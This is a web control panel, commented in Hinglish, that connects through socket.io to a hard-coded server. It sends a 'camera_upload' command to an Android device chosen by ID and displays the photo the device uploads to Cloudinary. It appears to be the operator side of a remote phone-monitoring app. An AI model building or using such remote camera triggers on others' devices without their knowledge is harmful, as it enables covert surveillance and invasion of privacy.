<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cloudinary Camera View</title>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        body { margin: 0; background: #000; color: white; font-family: sans-serif; display: flex; flex-direction: column; height: 100vh; }
        
        .header { padding: 15px; background: #111; border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center; }
        .status { font-size: 0.9rem; color: #888; }
        .online { color: #00ff88; font-weight: bold; }

        /* Photo Area */
        .photo-area { 
            flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; 
            padding: 20px;
        }

        #displayedImage { 
            max-width: 90%; max-height: 70vh; 
            border: 2px solid #333; border-radius: 10px; 
            display: none; /* Pehle chhupa rahega */
            box-shadow: 0 0 20px rgba(0,255,136, 0.2);
        }

        .loader { display: none; text-align: center; }
        .fa-spin { color: #00ff88; margin-bottom: 10px; }

        /* Button Area */
        .controls { 
            background: #111; padding: 20px; text-align: center; 
            border-top: 1px solid #333;
        }

        .btn {
            background: linear-gradient(45deg, #00c6ff, #0072ff);
            border: none; color: white; padding: 15px 30px;
            font-size: 18px; border-radius: 50px; cursor: pointer;
            box-shadow: 0 5px 15px rgba(0, 114, 255, 0.4);
            transition: 0.3s;
        }
        .btn:active { transform: scale(0.95); }
        .btn:disabled { background: #444; cursor: not-allowed; }

    </style>
</head>
<body>

    <div class="header">
        <div><i class="fa-solid fa-cloud"></i> CLOUD CAM</div>
        <div id="status" class="status">Connecting...</div>
    </div>

    <div class="photo-area">
        <h3 id="msg" style="color: #444;">Click button to capture</h3>

        <div id="loader" class="loader">
            <i class="fa-solid fa-circle-notch fa-3x fa-spin"></i>
            <p>Capturing & Uploading to Cloud...</p>
        </div>

        <img id="displayedImage" src="" alt="Cloud Photo">
    </div>

    <div class="controls">
        <button id="capBtn" class="btn" onclick="captureToCloud()">
            <i class="fa-solid fa-camera"></i> Capture & Upload
        </button>
    </div>

    <script>
        // ðŸ”¥ Apna Server URL yaha daalo
        const SERVER_URL = "https://child-v9no.onrender.com"; 
        
        let socket;
        // URL se device ID nikalo (?id=12345)
        let deviceId = new URLSearchParams(window.location.search).get('id');

        const imgTag = document.getElementById('displayedImage');
        const loader = document.getElementById('loader');
        const msg = document.getElementById('msg');
        const statusDiv = document.getElementById('status');
        const btn = document.getElementById('capBtn');

        if(!deviceId) {
            statusDiv.innerText = "Error: No Device ID";
            btn.disabled = true;
        } else {
            init();
        }

        function init() {
            socket = io(SERVER_URL);

            socket.on("connect", () => {
                statusDiv.innerHTML = 'Status: <span class="online">Online</span>';
                socket.emit("join", deviceId); // Admin room join
            });

            socket.on("disconnect", () => {
                statusDiv.innerText = "Status: Offline";
            });

            // ðŸ”¥ Yaha Cloudinary ka Link aayega
            // Event ka naam 'cloud_url' rakha hai (Server/App same bheje)
            socket.on("cloud_url", (data) => {
                console.log("Photo URL aa gaya:", data);
                
                // Hide Loader
                loader.style.display = "none";
                
                // Show Image
                if(data && data.startsWith("http")) {
                    imgTag.src = data;
                    imgTag.style.display = "block";
                    msg.style.display = "none";
                    btn.disabled = false;
                    btn.innerHTML = '<i class="fa-solid fa-camera"></i> Capture Again';
                } else {
                    alert("Invalid URL received: " + data);
                }
            });
        }

        function captureToCloud() {
            if(!socket.connected) { alert("Server not connected"); return; }

            // UI Update
            imgTag.style.display = "none";
            msg.style.display = "none";
            loader.style.display = "block";
            btn.disabled = true;
            btn.innerText = "Wait...";

            // Send Command to Android
            // Command: 'camera_upload' (Taki App samajh jaye ki Cloud pe dalna hai)
            socket.emit("command", {
                room: deviceId,
                command: "camera_upload" 
            });
        }
    </script>
</body>
</html>
